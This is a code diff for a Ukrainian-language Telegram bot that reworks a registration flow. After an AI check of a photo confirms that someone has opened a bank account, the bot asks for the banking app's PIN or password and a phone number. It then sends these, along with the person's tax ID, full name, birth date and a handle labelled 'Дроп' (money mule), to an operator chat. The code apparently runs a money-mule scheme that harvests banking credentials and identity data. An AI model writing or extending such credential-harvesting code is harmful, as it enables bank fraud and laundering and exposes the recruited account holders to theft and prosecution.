@@ -329,14 +329,14 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
         )
         
         if "[SUCCESS_VERIFICATION]" in response:
-            clean_response = response.replace("[SUCCESS_VERIFICATION]", "").strip()
-            # Прибираємо стандартний підпис ШІ для чистоти діалогу при переході до анкетування
-            clean_response = clean_response.replace("\n\nЯ всього автоматизатор, якщо я не вирішую вашу проблему зверніться до менеджера", "")
-            
-            await message.answer(clean_response)
+            bank_label = current_bank_name if current_bank_name else "банк"
+            success_text = (
+                f"Чудово {bank_label} успішно зареєстрували.\n\n"
+                f"Який пін-код чи пароль ставали на додаток?"
+            )
+            await message.answer(success_text)
             await state.update_data(success_photo_id=photo.file_id)
-            await message.answer("Будь ласка, напишіть Ваш номер телефону?")
-            await state.set_state(RegistrationStates.waiting_phone)
+            await state.set_state(RegistrationStates.waiting_password)
             return
 
         await message.answer(response)
@@ -402,9 +402,18 @@ async def process_request_code(callback: CallbackQuery, bot: Bot):
         )
 
 
+@router.message(RegistrationStates.waiting_password, F.chat.type == "private")
+async def process_client_password(message: Message, state: FSMContext):
+    password = message.text.strip()
+    await state.update_data(client_password=password)
+    await message.answer("Будь ласка, напишіть Ваш номер телефону?")
+    await state.set_state(RegistrationStates.waiting_phone)
+
+
 @router.message(RegistrationStates.waiting_phone, F.chat.type == "private")
 async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
     text = message.text.strip()
+    client_id = message.from_user.id
     
     # 1. Перевіряємо чи це запитання "для чого?" / "навіщо?"
     question_pattern = re.compile(
@@ -426,31 +435,16 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
         )
         return
 
-    # Зберігаємо телефон
-    await state.update_data(client_phone=text)
-    
-    await message.answer(
-        "Тепер введіть пароль, який Ви встановили при реєстрації?"
-    )
-    await state.set_state(RegistrationStates.waiting_password)
-
-
-@router.message(RegistrationStates.waiting_password, F.chat.type == "private")
-async def process_client_password(message: Message, state: FSMContext, bot: Bot):
-    password = message.text.strip()
-    client_id = message.from_user.id
-    
-    session = await db.get_session(client_id)
-    if not session:
-        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
-        await state.clear()
-        return
-
     data = await state.get_data()
-    client_phone = data.get('client_phone')
+    client_password = data.get('client_password')
     success_photo_id = data.get('success_photo_id')
     
     await state.clear()
+
+    session = await db.get_session(client_id)
+    if not session:
+        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
+        return
 
     # Розпарсимо PIB, DOB, IPN з client_data
     ipn_match = re.search(r'ІПН:\s*(\d+)', session['client_data'])
@@ -477,7 +471,7 @@ async def process_client_password(message: Message, state: FSMContext, bot: Bot)
         f"ІПН: {ipn}\n"
         f"ПІБ: {pib}\n"
         f"Дата: {dob}\n"
-        f"Телефон: {client_phone}\n\n"
+        f"Телефон: {text}\n\n"
     )
     
     username = message.from_user.username
@@ -485,7 +479,7 @@ async def process_client_password(message: Message, state: FSMContext, bot: Bot)
         anketa_text += f"Дроп - @{username}\n\n"
         
     anketa_text += f"{line_str}\n\n"
-    anketa_text += f"{password}"
+    anketa_text += f"{client_password}"
     
     from bot.config import ANKETA_CHAT_ID
     target_chat = ANKETA_CHAT_ID or ADMIN_ID
